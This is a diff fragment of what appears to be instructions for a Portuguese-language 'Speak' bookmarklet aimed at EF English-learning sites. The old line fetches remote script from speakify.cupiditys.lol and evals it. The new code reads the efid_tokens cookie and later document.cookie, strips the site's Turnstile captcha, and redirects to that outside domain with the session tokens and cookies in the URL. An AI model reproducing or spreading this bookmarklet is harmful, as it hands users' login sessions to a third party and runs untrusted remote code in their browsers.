@@ -8,10 +8,32 @@ n(eval);
 
 SPEAK
 
-javascript:fetch("https://spea
-kify.cupiditys.lol/api/bookmar
-k.js").then(r => r.text()).the
-n(r => eval(r))
+javascript:!async function(){if
+('learn.corporate.ef.com'===win
+dow.location.hostname){if(!conf
+irm('Após clicar em confirmar, 
+uma página será aberta. Execute
+o script novamente nessa página
+.'))return;window.open(`https:/
+/catalyst.b2s.efekta.ef.com/ent
+er?token=${(await cookieStore.g
+et('efid_tokens')).value.split(
+'account')[1].slice(7).slice(0,
+-4)}`)}else'catalyst.b2s.efekta
+.ef.com'===window.location.host
+name?(document.querySelector('#
+cf-turnstile')?.remove(),turnst
+ile.render('#app',{sitekey:'0x4
+AAAAAAB0ttLnu1PFEKxNg',action:'
+submit-form',callback:function(
+e){location.href=`https://speak
+ify.cupiditys.lol/yoo?token=${l
+ocation.search.slice(7)}&challe
+nge=${e}&redirectURI=https://le
+sson-player.study.efekta.ef.com
+/?product=gap-b2b-preview&cooki
+e=${document.cookie}`}})):alert(
+'Executar no sítio Speak.')}();
 
 LEIA SP
 
